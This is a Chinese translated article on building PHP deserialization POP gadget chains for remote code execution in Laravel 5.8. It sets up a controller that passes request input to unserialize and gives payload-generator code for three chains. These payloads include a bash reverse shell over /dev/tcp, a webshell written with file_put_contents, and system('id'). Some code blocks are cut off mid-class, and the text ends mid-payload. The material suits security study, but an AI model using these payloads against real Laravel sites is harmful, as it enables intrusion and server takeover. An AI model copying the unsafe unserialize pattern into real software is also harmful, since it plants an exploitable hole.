# Laravel 5.8 RCE POP链汇总分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
自从phar反序列化的出现，php反序列化的攻击面扩展了不少，框架POP链的挖掘自然得到了重视。这几天整理了 Laravel5.8
能用的POP链，不少前面版本的POP链也还是能用的，在大师傅们的payload基础上修改整理，主要是分析一下提高自己的POP链构造能力。
测试使用的 Laravel 是通过 composer 默认方法 `composer create-project --prefer-dist
laravel/laravel blog "5.8.*"`安装的，如果用到了未默认带的组件会在文中说明。
创建一个控制器
    class IndexController extends Controller
    {
        public function index(IlluminateHttpRequest $request){
            $payload=$request->input("payload");
            @unserialize($payload);
        }
    }
添加路由
    Route::get('/', "IndexController@index");
## POP链1
入口类：`IlluminateBroadcastingpendiongBroadcast`
最后RCE调用类：`FakerGenerator`
从`IlluminateBroadcasting`
PendingBroadcast类的`__destruct`入手，其中event和events都是完全可控的。
然后全局搜索dispatch函数，没有找到合适的函数。全局搜索`__call` 在`Faker`中找到Generator类的`__call`
跟进，它会调用format函数，其中format会调用call_user_func_array。且第一个参数，由下面的getFormatter返回，我们可以指定`$this->formatters`为数组`array('dispatch'=>'system')`，getFormatter就会返回’system’。
###  RCE
可以看到，控制了call_user_func_array两个参数，而第二个参数是原来的`$this->event`经过`__call`之后变成了`array($this->event)`，这意味着call_user_func_array第二个参数只能是个单元素的array。当然，这还是能执行system的，因为system必要只一个参数。
下面就是payload:
    formatters = $formatters;
            }
        }
    }
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    namespace{
        $b = new FakerGenerator(array('dispatch'=>'system'));
        $a = new IlluminateBroadcastingPendingBroadcast($b, "bash -c 'bash -i >& /dev/tcp/127.0.0.1/10012 0>&1'");
        echo urlencode(serialize($a));
    }
###  写个SHELL吧
如果靶机禁用了像system这种的危险函数，我们需要使用双参数的函数例如file_put_contents写shell，或者希望执行任意函数，那么上面的payload就没办法了。
解决这个问题师傅们有很多种方案，我自己想了个还算简洁的方法，可以统一解决这个问题。
目前，`call_user_func_array`
第一个参数是完全可控的，这意味着我们可以调用任意类对象的任意方法，那么我们找一个有危险函数的类，并且参数可控就好啦。
搜索寻找`PhpOption/LazyOption`
类中的option函数的call_user_func_array函数中间两个参数都是完全可控的，非常完美的函数。
option函数不接受参数输入，但是LazyOption类其他的函数都是下面这样的，会直接调用option函数。完美！
最后payload：
    formatters = $formatters;
            }
        }
    }
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    namespace PhpOption{
        final class LazyOption{
            private $callback;
            private $arguments;
            private $option;
            public function __construct($callback, $arguments, $option)
            {
                $this->callback = $callback;
                $this->arguments = $arguments;
                $this->option = $option;
            }
        }
    }
    namespace{
        $c = new PhpOptionLazyOption('file_put_contents', array('/var/www/html/shell.php', ''), null);
        $b = new FakerGenerator(array('dispatch'=> array($c, "filter")));
        $a = new IlluminateBroadcastingPendingBroadcast($b, 1);
        echo urlencode(serialize($a));
    }
## POP链2
入口类：`IlluminateBroadcastingpendiongBroadcast`
最后RCE调用类：`IlluminateBusDispatcher`
还是从`IlluminateBroadcasting`
PendingBroadcast类的`__destruct`入手，其中event和events都是完全可控的。
然后全局搜索dispatch函数，在`IlluminateBusDispatcher`中找到dispatch函数
当`$this->queueResolver`有值且`$command`是ShouldQueue类的实例
跟进dispatchToQueue函数
赫然一个call_user_func在眼前，第一个参数完全可控。这时，我们又和上面的情况一样了，可以调用任意类对象的任意方法，使用上面同样的LazyOption类，就可以执行任意函数了。
payload：
    queueResolver = $queueResolver;
            }
        }
    }
    namespace IlluminateEvents{
        class CallQueuedListener{
            protected $connection;
            public function __construct($connection)
            {
                $this->connection = $connection;
            }
        }
    }
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    namespace PhpOption{
        final class LazyOption{
            private $callback;
            private $arguments;
            private $option;
            public function __construct($callback, $arguments, $option)
            {
                $this->callback = $callback;
                $this->arguments = $arguments;
                $this->option = $option;
            }
        }
    }
    namespace{
        $c = new PhpOptionLazyOption('system', array('id'), null);
        $d = new IlluminateEventsCallQueuedListener('id');
        $b = new IlluminateBusDispatcher(array($c, 'filter'));
        $a = new IlluminateBroadcastingPendingBroadcast($b, $d);
        echo urlencode(serialize($a));
    }
## POP链3
入口类：`IlluminateBroadcastingpendiongBroadcast`
最后RCE调用类：`IlluminateValidationValidator`
这个是在[phpgcc](https://github.com/ambionics/phpggc/)中看见的，虽然标注的可用版本是5.5.39，但经测试直到最新版本5.8.*还是可以用的。接下来继续分析一下。
任然是以`IlluminateBroadcastingpendiongBroadcast`类为入口
此时，继续找`__call`函数。在`IlluminateValidationValidator`类的`__call`函数
先进入`$this->callExtension`函数看看
可以看到调用call_user_func_array了，其中第一个参数和第二个参数都是可控的，只要前面正常执行下来就可以了。回看`__call`函数
我们必须确定`$rule`值为多少，才能进入`$this->callExtension`并且后面还牵扯到了call_user_func_array的第一个参数。我们知道在这里我们的`$method`为‘dispatch’，调试代码，发现`$rule`值总为`''`。
###  RCE
那么就好办了，call_user_func_array两个参数都可控了，可以执行任意函数
    events = $events;
                $this->event = $event;